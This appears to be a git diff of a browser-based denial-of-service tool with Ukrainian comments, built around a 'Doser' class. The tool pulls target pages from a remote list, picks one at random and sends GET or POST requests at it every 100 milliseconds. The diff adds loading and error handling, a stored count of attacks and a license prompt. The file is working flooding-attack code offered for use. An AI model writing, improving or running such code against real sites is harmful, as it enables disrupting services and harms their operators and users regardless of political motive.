@@ -24,19 +24,31 @@ async function getSalt(target) {
 
 // Завантаження цілей
 async function getTarget() {
-    targets = await fetch(targetSource);
-    data = await targets.json();
+	$("#load").remove()
+	$("<p>", {id:"load"}).text("Завантажуємо цілі...")
+	.appendTo(box);
 
-    targets = [];
+    targets = await fetch(targetSource)
+    .catch((e) => {
+    	$("#load").text("Помилка завантаження!");
+    	alert(`Помилка!\nПеревірте підключення до інтернету!\nТекст помилки: ${e}`);
+    });
+    if (targets instanceof Response) {
+    	data = await targets.json();
 
-    // Фільтрування цілей
-    for (let i = 0; i < data.length; i++) {
-        if (['post', 'get'].includes(data[i].method)) {
-        	targets.push(data[i])
-        }
-    };
+		targets = [];
 
-    return targets[randint(targets.length)] // Рандомна ціль
+		// Фільтрування цілей
+		for (let i = 0; i < data.length; i++) {
+		    if (['post', 'get'].includes(data[i].method)) {
+		        targets.push(data[i])
+		    }
+		};
+		$("#load").remove()
+	   	
+	    return targets[randint(targets.length)] // Рандомна ціль
+    }
+    return null
 }
 
 
@@ -59,14 +71,20 @@ let targetField = $("#target")
 let methodField = $("#method")
 
 setTarget = (target) => {
-	targetField.text(target.page);
-    methodField.text(target.method.toUpperCase());
+	if (target != null) {
+		targetField.text(target.page);
+	    methodField.text(target.method.toUpperCase());
+	    return true
+	} else {
+		return false
+	}
 }
 
 
 class Doser {
     attack = false; // Status of attack
     interval;
+    saver;
 
     async start(isFetch=false) {
     	this.attack = true;
@@ -76,7 +94,12 @@ class Doser {
         btn.text("Стоп");
         let target = await getTarget();
 
-        setTarget(target);
+        let set = setTarget(target);
+        if (!set) {
+        	this.attack = false;
+        	btn.text("Старт!");
+        	return
+        }
         console.log(target);
 
         this.interval = setInterval(isFetch ? async function () {
@@ -103,12 +126,20 @@ class Doser {
 
         	add_count();
 
-        	if ($("#frame").childElementCount > 200) {Frames.clear()};
+        	if ($("#frame")[0].childElementCount >= 200) {Frames.clear()};
         }, 100);
+
+        this.saver = setInterval(() => {
+        	let atck = LocalStorage.getItem("attacks")
+
+        	atck = parseInt(atck == NaN ? 0 : atck) // Попередні атаки
+        	LocalStorage.setItem("attacks", atck + parseInt(attacks.text()))
+        }, 3000)
     };
     stop() {
     	this.attack = false;
     	clearInterval(this.interval);
+    	clearInterval(this.saver);
     	Frames.clear()
     	btn.text("Старт!");
     };
@@ -117,15 +148,31 @@ class Doser {
 
 
 let btn = $("#button")
+let LocalStorage = window.localStorage
+let box = $(".box")
 
 $(() => {
 	Doser = new Doser // Ініціалізація воркера
 
-	btn.on('click', (e) => {
+	if (!LocalStorage.getItem("check_license")) {
+		alert('Прочитайте ліцензію в розділі "Ресурси"!')
+		LocalStorage.setItem("check_license", "true")
+	}
+
+	btn.click((e) => {
 		e.preventDefault();
 
 		!Doser.attack ? Doser.start() : Doser.stop();
+	});
+	$("#attackCount").click(() => {
+		let a = LocalStorage.getItem("attacks")
+		alert(`Взагалом атаковано: ${!a ? 0 : a}`)
 	})
+	/*
+	$(".item").click(() => {
+		copy(window.location + `#${$(this.id)}`)
+	})
+	*/
 })
 
 // Слава Україні!
